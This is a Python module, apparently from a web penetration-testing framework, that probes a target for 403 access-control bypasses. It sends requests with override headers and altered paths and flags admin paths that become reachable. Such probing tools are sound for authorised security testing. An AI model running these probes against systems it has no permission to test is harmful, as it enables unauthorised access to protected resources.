from __future__ import annotations

from urllib.parse import urljoin

from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads


class Bypass403Module(ExploitModule):
    name = "403 Bypass"
    category = "access"

    async def run(self, ctx):
        evidence = []
        base = ctx.target.url.rstrip("/") + "/"
        for payload in get_payloads(self.name):
            if payload.startswith("X-"):
                parts = payload.split(":", 1)
                try:
                    r = await ctx.http.request("GET", base, headers={parts[0].strip(): parts[1].strip()}, follow_redirects=False)
                except Exception as exc:
                    evidence.append(str(exc)); continue
                if r.status_code in (200, 204, 301, 302, 307, 308):
                    ctx.add_finding(base, payload, self.name, f"HTTP {r.status_code}; alternate URL header changed access behavior", confidence="medium")
                    return ExploitResult(self.name, "signal", "Potential 403 bypass via request header", evidence=base)
                evidence.append(f"{base} [{payload}] -> {r.status_code}")
                continue
            path = payload if payload.startswith("/") else "/" + payload
            url = urljoin(base, path)
            try:
                r = await ctx.http.request("GET", url, follow_redirects=False)
                evidence.append(f"{url} -> {r.status_code}, {len(r.text)} bytes")
                if r.status_code in (200, 204) and "/admin" in path:
                    ctx.add_finding(url, payload, self.name, f"HTTP {r.status_code}; protected-path variant accessible", confidence="high")
                    return ExploitResult(self.name, "signal", "Potential 403 bypass observed", evidence=url)
            except Exception as exc:
                evidence.append(str(exc))
        return ExploitResult(self.name, "no-signal", "403-bypass probes completed", evidence="\n".join(evidence[:20]))
